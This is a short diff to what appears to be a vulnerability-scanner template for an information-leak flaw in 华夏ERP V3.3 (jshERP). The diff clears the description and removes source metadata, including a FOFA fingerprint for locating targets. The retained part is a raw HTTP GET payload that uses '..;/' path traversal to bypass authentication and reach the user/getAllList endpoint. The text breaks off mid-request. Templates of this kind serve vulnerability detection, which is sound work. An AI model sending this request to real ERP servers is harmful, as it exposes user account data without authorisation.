@@ -3,12 +3,8 @@ info:
   name: 华夏ERPV3.3存在信息泄漏漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ypivrfd2k4ddx7ga'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ypivrfd2k4ddx7ga
-    fofa: web.icon=="f6efcd53ba2b07d67ab993073c238a11"
 http:
 - raw:
   - 'GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
